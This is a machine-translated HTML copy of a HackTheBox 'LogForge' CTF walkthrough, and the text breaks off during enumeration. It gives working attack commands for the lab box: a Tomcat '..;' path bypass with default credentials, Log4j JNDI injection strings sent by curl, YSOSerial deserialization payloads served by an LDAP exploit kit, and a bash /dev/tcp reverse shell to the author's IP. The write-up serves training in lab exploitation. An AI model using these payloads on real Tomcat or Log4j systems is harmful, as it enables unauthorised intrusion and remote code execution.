<html>
<head>
<title>LogForge from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的LogForge详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/logforge-from-hackthebox-detailed-walkthrough-9c3a921a9171?source=collection_archive---------1-----------------------#2022-01-02">https://infosecwriteups.com/logforge-from-hackthebox-detailed-walkthrough-9c3a921a9171?source=collection_archive---------1-----------------------#2022-01-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e4e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="c109" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/b7039ff6c791f2bc70f7f3f682fd151e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1002/format:webp/0*5ZS-8HPG-tEv6NyI.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">HackTheBox的LogForge</figcaption></figure><p id="ac54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">LogForge是HackTheBox上的中型机器。由<a class="ae lv" href="https://twitter.com/ippsec" rel="noopener ugc nofollow" target="_blank"> Ippsec </a>为2021年12月<a class="ae lv" href="https://en.hackingesports.com.br/uhc" rel="noopener ugc nofollow" target="_blank"> UHC </a>总决赛创建，它专注于利用Log4j中的漏洞。</p><p id="d101" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们从一个简单的网站开始，在这里我们使用路径遍历和默认凭证来访问Tomcat应用程序管理器。在那里，我们使用JNDI查询来实现远程代码执行，并最终获得一个反向外壳。升级到root用户是通过反编译服务器上基于Java的FTP应用程序实现的，然后在其中使用JNDI查询来揭示包含用户名和密码的环境变量。</p><p id="0abc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所需的技能是网络和操作系统枚举，研究和操纵利用。学到的技能是利用JNDI漏洞和JAVA反序列化攻击。</p><div class="lw lx gp gr ly lz"><a href="https://www.hackthebox.com/home/machines/profile/428" rel="noopener  ugc nofollow" target="_blank"><div class="ma ab fo"><div class="mb ab mc cl cj md"><h2 class="bd ir gy z fp me fr fs mf fu fw ip bi translated">破解盒子::渗透测试实验室— LogForge</h2><div class="mg l"><h3 class="bd b gy z fp me fr fs mf fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mh l"><p class="bd b dl z fp me fr fs mf fu fw dk translated">www.hackthebox.com</p></div></div><div class="mi l"><div class="mj l mk ml mm mi mn lp lz"/></div></div></a></div><h1 id="28cd" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="4c2c" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mt"><img src="../Images/f575ac89fa953290cdf80d6c2e06fca3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IQC0WQDUeN9ob5_CCe09Zw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmap TCP端口扫描</figcaption></figure><p id="1111" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到两个开放端口，SSH在22上，HTTP在80上，两个过滤端口FTP在21上，另一个HTTP服务在8080上。让我们先来看看Apache:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi my"><img src="../Images/945f24cd4b144fd430d34275a9d6c26b.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/0*URbgzeMAo6fj9sTi.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">端口80上的网站</figcaption></figure><h1 id="d5a4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Feroxbuster</h1><p id="86be" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">我们只找到一张图片，查看源代码，这里没有什么有趣的东西。让我们尝试模糊隐藏文件夹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi mz"><img src="../Images/c5a436a8353058cc2e54fb2a251542f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EZyOe4s7n4JKdgBVvSNIpA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Feroxbuster扫描隐藏文件夹</figcaption></figure><p id="466e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它发现了几个文件夹，我们看到禁止从端口80访问:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/4245b7b8f162acc5ab17ce2bffc03da3.png" data-original-src="https://miro.medium.com/v2/resize:fit:816/format:webp/0*cm4BF96jd-rU1080.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">禁止访问经理</figcaption></figure><p id="4008" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有趣的是，试图访问不存在的东西显示Tomcat正在运行:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/88ebb337d3369e488092a20f2ceaa189.png" data-original-src="https://miro.medium.com/v2/resize:fit:928/format:webp/0*fGcf2xVhg7lBEOhG.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">在端口8080上运行的Tomcat</figcaption></figure><p id="c9e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以假设Tomcat运行在它的默认端口8080上，Apache正在重定向到它。</p><h1 id="a90a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">路径遍历</h1><p id="7fb4" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">有了这个知识，我们可以使用在另一个叫做<a class="ae lv" href="https://pencer.io/ctf/ctf-htb-seal/#path-traversal" rel="noopener ugc nofollow" target="_blank">密封</a>的HTB盒上使用的同样的旁路技术。这里详细的<a class="ae lv" href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/" rel="noopener ugc nofollow" target="_blank">我们可以简单地使用</a>..；在我们不存在的路径之后，然后放入我们想要访问的文件夹，在这里我们试图到达管理器:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/314faaea5516546bf5ae71b82f6783b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/0*Zb4FbNhZujrLVrl-.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Tomcat管理器登录旁路</figcaption></figure><p id="6347" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">tomcat管理器应用程序的登录框弹出，使用tomcat的默认凭证:Tomcat让我们进入:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nd"><img src="../Images/1feb9b44cd427b98c1217e17b4ce6479.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*js1g2j9eja-DMeo-.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Tomcat Web应用程序管理器</figcaption></figure><p id="9cea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着上传一个msfvenom生成的war文件，就像我们在Seal box <a class="ae lv" href="https://pencer.io/ctf/ctf-htb-seal/#msfvenom" rel="noopener ugc nofollow" target="_blank">这里</a>所做的一样，但是这个方法被1kb的文件大小限制阻止了。这个盒子叫做LogForge，所以我们可以安全地假设我们的路径现在正在使用log4j漏洞进行。</p><h1 id="7856" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">利用JNDI查询</h1><p id="c33f" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">如果你在未来的某个时候读到这篇文章，希望事情已经平息了，但现在log4j和利用JNDI的漏洞已经遍布互联网。如果你需要的话，可以在这里<a class="ae lv" href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html" rel="noopener ugc nofollow" target="_blank">和</a><a class="ae lv" href="https://thenewstack.io/log4shell-we-are-in-so-much-trouble/" rel="noopener ugc nofollow" target="_blank">这里</a>读一点。Reddit <a class="ae lv" href="https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/" rel="noopener ugc nofollow" target="_blank">上还有一个很好的资源，这里有一个</a>的例子，其中包括试图利用这个漏洞时可以尝试的JNDI查询。</p><p id="43b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将简单地开始，并尝试使用以下查询通过ldap让机器联系我:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="43d9" class="nj km iq nf b gy nk nl l nm nn">${jndi:ldap://10.10.14.12/pencer}</span></pre><p id="beac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Kali上启动nc监听，然后尝试将上面的内容粘贴到我们在Tomcat Manager应用程序上找到的各个字段中:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi no"><img src="../Images/38ce314b43f9e5fa294a47ca8c3239ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PKUMUqXE5whKll-I.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">测试JNDI漏洞</figcaption></figure><p id="6a0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">粘贴并按下Expire Sessions按钮后，切换到Kali上的nc:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f439" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# nc -nlvp 389<br/>listening on [any] 389 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 48504<br/>0<br/> `�</span></pre><p id="5115" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些字符证明服务器试图通过LDAP在端口389上连接到我们。我们也可以用curl代替浏览器来做这件事，就像我们在box <a class="ae lv" href="https://pencer.io/ctf/ctf-htb-dynstr/#api-investigation" rel="noopener ugc nofollow" target="_blank"> Dynstr </a>上做的那样:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="047a" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~]<br/>└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12/pencer}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><p id="3656" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意，在用curl做这件事的时候，我对用户名和密码进行了base64编码，所以它可以在头中传递。</p><p id="7a1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了能够利用这一点，我们需要一个LDAP服务器等待Kali。我们还需要一种与JNDI交互的方式，以便能够将Java有效载荷发送回来。</p><h1 id="3860" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JNDI漏洞工具包</h1><p id="2209" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">幸运的是，我们有<a class="ae lv" href="https://github.com/pimps/JNDI-Exploit-Kit" rel="noopener ugc nofollow" target="_blank">这套</a>神奇的装备。让我们抓住它看一看:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ef0d" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# git clone https://github.com/pimps/JNDI-Exploit-Kit.git<br/>Cloning into 'JNDI-Exploit-Kit'...<br/>remote: Enumerating objects: 328, done.<br/>remote: Counting objects: 100% (328/328), done.<br/>remote: Compressing objects: 100% (232/232), done.<br/>remote: Total 328 (delta 123), reused 230 (delta 61), pack-reused 0<br/>Receiving objects: 100% (328/328), 27.74 MiB | 10.42 MiB/s, done.<br/>Resolving deltas: 100% (123/123), done.<br/><br/>┌──(root💀kali)-[~/htb/logforge]<br/>└─# cd JNDI-Exploit-Kit</span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi np"><img src="../Images/b9fcb2beaf021a0d5dafd9d48de79263.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jEwExyTHHWSkPGFLmi6r_Q.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDI漏洞工具包</figcaption></figure><h1 id="a08a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">YSOSerial</h1><p id="96a2" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">原始漏洞利用工具包的这个分支支持一个YSOSerial二进制有效载荷。让我们抓住YSOSerial的<a class="ae lv" href="https://github.com/pimps/ysoserial-modified" rel="noopener ugc nofollow" target="_blank">修改版本</a>，因为它支持多个命令，这将使我们的反向shell有效负载更容易:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c2cd" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# git clone https://github.com/pimps/ysoserial-modified.git<br/>Cloning into 'ysoserial-modified'...<br/>remote: Enumerating objects: 324, done.<br/>remote: Total 324 (delta 0), reused 0 (delta 0), pack-reused 324<br/>Receiving objects: 100% (324/324), 84.22 MiB | 15.72 MiB/s, done.<br/>Resolving deltas: 100% (94/94), done.<br/><br/>┌──(root💀kali)-[~/htb/logforge]<br/>└─# cd ysoserial-modified/target</span><span id="e244" class="nj km iq nf b gy nq nl l nm nn">┌──(root💀kali)-[~/htb/logforge/ysoserial-modified/target]<br/>└─# java -jar ysoserial-modified.jar -h<br/>Y SO SERIAL?<br/>Usage: java -jar ysoserial-[version]-all.jar [payload type] [terminal type: cmd / bash / powershell / none] '[command to execute]'<br/>   ex: java -jar ysoserial-[version]-all.jar CommonsCollections5 bash 'touch /tmp/ysoserial'<br/>        Available payload types:<br/>                BeanShell1 [org.beanshell:bsh:2.0b5]<br/>                C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11]<br/>                CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]<br/>                CommonsCollections1 [commons-collections:commons-collections:3.1]<br/>                CommonsCollections2 [org.apache.commons:commons-collections4:4.0]<br/>                CommonsCollections3 [commons-collections:commons-collections:3.1]<br/>                CommonsCollections4 [org.apache.commons:commons-collections4:4.0]<br/>                CommonsCollections5 [commons-collections:commons-collections:3.1]<br/>&lt;SNIP&gt;</span></pre><p id="d6eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">YSOSerial非常全面，HackTricks在这里有一些关于反序列化概念和使用YSOSerial来利用这种攻击方法的有用信息。根据工具描述:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="0bd1" class="nj km iq nf b gy nk nl l nm nn">ysoserial is a collection of utilities and property-oriented programming "gadget chains" discovered in common java libraries that can, under the right conditions, exploit Java applications performing unsafe de-serialization of objects.</span></pre><p id="dbbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里的关键点是，它利用目标应用程序上可能已经存在的公共代码，允许我们执行自己的代码。</p><h1 id="df08" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Java反序列化攻击</h1><p id="2ac3" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">让我们创建一个简单的有效负载，它将从机器上ping我:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="e725" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'ping -c 4 10.10.14.12' &gt; pencer.ser</span><span id="f993" class="nj km iq nf b gy nq nl l nm nn">WARNING: An illegal reflective access operation has occurred<br/>WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/htb/logforge/ysoserial-modified/target/ysoserial-modified.jar) to field javax.management.BadAttributeValueExpException.val<br/>WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5<br/>WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations<br/>WARNING: All illegal access operations will be denied in a future release</span></pre><p id="8f3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">忽略警告，因为这很正常。上面创建了一个名为pencer.ser的文件，该文件一旦在目标上反序列化，就会尝试ping我的Kali IP四次。对于这个盒子，我使用了CommonsCollections5，你可能需要尝试几个不同的，直到你得到一个可以在另一个盒子上工作的。接下来启动JNDI漏洞利用工具包，告诉它有效负载是我的pencer.ser文件，并使用我的Kali tun0 IP在端口389上启动LDAP服务器:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nr"><img src="../Images/94252d52d23a5a2852fbd85b4b92b4c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_8NNCrO2M7yQerXHBXA0cQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDI漏洞利用工具包服务器pencer.ser有效负载</figcaption></figure><p id="1fe1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，根据我们正在处理的JDK版本，不同的环境有不同的目标。你可能需要反复试验才能找到适合你的另一个盒子。</p><p id="8338" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在那个列表中，这是我使用的一个:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="c887" class="nj km iq nf b gy nk nl l nm nn">Target environment(Build in JDK 1.5 whose trustURLCodebase is true):<br/>rmi://10.10.14.12:1099/u3rmld<br/>ldap://10.10.14.12:389/u3rmld</span></pre><p id="d96b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，在另一个终端中启动tcpdump侦听ICMP数据包，以捕获来自机器的ping:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="27c7" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~]<br/>└─# tcpdump -ni tun0 icmp<br/>tcpdump: verbose output suppressed, use -v[v]... for full protocol decode<br/>listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span></pre><p id="8518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以像以前一样使用curl来触发JNDI漏洞利用，但这一次我们将它指向JNDI漏洞利用工具包托管的目标，所以使用我们从上面选择的那个:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="8247" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/u3rmld}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><p id="0265" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">切换到tcpdump查看ping:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi ns"><img src="../Images/2f68dd12672ce5169ec69e142f648ec5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5OZ1ccSanEyMJCISGeu8sg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">对ping使用JNDI漏洞的响应</figcaption></figure><p id="67e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您回头看看我们使用exploit kit运行的LDAP服务器，我们会看到连接，我们的响应是传递pencer.ser有效负载:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nt"><img src="../Images/664ee0adea73acc188f23a254725a82d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qW_Vr0EZFHGvQXKzgJbGbQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">JNDI漏洞利用工具包LDAP服务器响应有效负载</figcaption></figure><p id="4cb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这证实了我们可以在服务器上远程执行代码。让我们给自己弄一个反向shell，使用PentestMonkey的一个简单的shell，就像我们在<a class="ae lv" href="https://pencer.io/ctf/ctf-htb-dynstr/#reverse-shell" rel="noopener ugc nofollow" target="_blank"> Dynstr </a>上做的一样:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="0203" class="nj km iq nf b gy nk nl l nm nn">bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337 0&gt;&amp;1</span></pre><p id="a008" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用YSOSerial再次创建我们的有效负载:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ab2c" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# java -jar ysoserial-modified/target/ysoserial-modified.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337 0&gt;&amp;1' &gt; shell.ser</span></pre><p id="7611" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">停止tcpdump并在端口1337上启动netcat侦听。停止JNDI利用工具包，并开始再次与我们新的反向外壳有效载荷:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="dc92" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# java -jar JNDI-Exploit-Kit/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -P ysoserial-modified/target/shell.ser -L 10.10.14.12:389</span></pre><p id="22bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">记下新的目标URL:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="bd61" class="nj km iq nf b gy nk nl l nm nn">Target environment(Build in JDK 1.5 whose trustURLCodebase is true):<br/>rmi://10.10.14.12:1099/ry0f9s<br/>ldap://10.10.14.12:389/ry0f9s</span></pre><p id="44e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像我们之前做的一样，使用curl来触发攻击:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f69a" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~/htb/logforge]<br/>└─# curl "http://10.10.11.138/pencer/..;/manager/html/expire?path=/" --data-binary "idle=\${jndi:ldap://10.10.14.12:389/ry0f9s}" <br/>-H "Authorization: Basic dG9tY2F0OnRvbWNhdA=="</span></pre><h1 id="e320" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">反向外壳</h1><p id="a3f9" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">如果一切顺利，切换到nc监听器来查看我们的shell连接:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="ca71" class="nj km iq nf b gy nk nl l nm nn">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.138] 49842<br/>bash: cannot set terminal process group (776): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>tomcat@LogForge:/var/lib/tomcat9$</span></pre><p id="b9a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们继续之前，让我们对shell进行通常的升级，以使它更容易使用:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="437a" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>tomcat@LogForge:/var/lib/tomcat9$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>┌──(root💀kali)-[~]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>tomcat@LogForge:/var/lib/tomcat9$ stty rows 52 cols 237<br/>tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm</span></pre><p id="ef50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你需要参考，我的博客上有这些<a class="ae lv" href="https://pencer.io/ctf/ctf-all-the-things/#upgrade" rel="noopener ugc nofollow" target="_blank"/>。</p><h1 id="19a8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户标志</h1><p id="2e66" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">让我们先抓住用户标志:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="f140" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt <br/>&lt;HIDDEN&gt;</span></pre><h1 id="8a5f" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">列举</h1><p id="b8bf" class="pw-post-body-paragraph jn jo iq jp b jq mo js jt ju mp jw jx jy mq ka kb kc mr ke kf kg ms ki kj kk ij bi translated">回到这个框的开头，我们在nmap扫描中看到了端口21。现在我们在盒子上，我们可以看看它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mu mv di mw bf mx"><div class="gh gi nu"><img src="../Images/6759036d7dcb2da6a351cad5dc3a63ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*o1vOZxfMWk4YYw8wz-w8uQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">act的netstat输出</figcaption></figure><p id="398a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Netstat显示有东西在监听21号端口。我们知道这是FTP的默认端口，让我们看看正在运行的进程:</p><pre class="lk ll lm ln gt ne nf ng nh aw ni bi"><span id="a0a1" class="nj km iq nf b gy nk nl l nm nn">tomcat@LogForge:/var/lib/tomcat9$ ps -ax | grep ftp<br/> 993 ?  Sl  0:26 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar</span></pre><h1 id="1f3e" class="kl km iq bd 